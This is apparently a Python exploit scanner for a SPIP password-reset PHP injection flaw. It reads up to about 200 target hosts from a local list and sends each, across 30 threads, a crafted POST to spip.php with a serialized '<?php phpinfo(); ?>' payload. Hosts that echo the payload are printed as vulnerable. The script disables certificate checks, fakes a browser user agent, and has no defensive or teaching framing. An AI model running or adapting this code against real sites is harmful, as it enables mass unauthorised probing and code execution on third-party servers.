import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result.txt'


def exploit(ip_, index):
    try:

        url = ip_+'/spip.php?page = spip_pass'
        # print(url)
        paylaod = {
            "page": "spip_pass",
            "formulaire_action": "oubli",
            "formulaire_action_args": "E1nK0hfOPllDtCUbG6L94SlEpZi7Vz17IKUbf0ZB6ET0WbEHeXrw9tNNCEWjm0ac0 % 2F4DuboKIZvygjRh",
            'oubli': 's: 19: "<?php phpinfo(); ?>"',
            "nobot": '',
        }
        res = requests.post(url, data=paylaod,
                            headers=headers, timeout=8, verify=False)
        if '<?php phpinfo(); ?>' not in res.text:
            # if len(res.text) < 40000:
            return
        print(res, len(res.text))
        print(ip_)
        # print(res.text)
        # with result_path.open('a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url)


threads = []
with open(r'D:\Downloads\tmp\spip.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+200

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 'm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
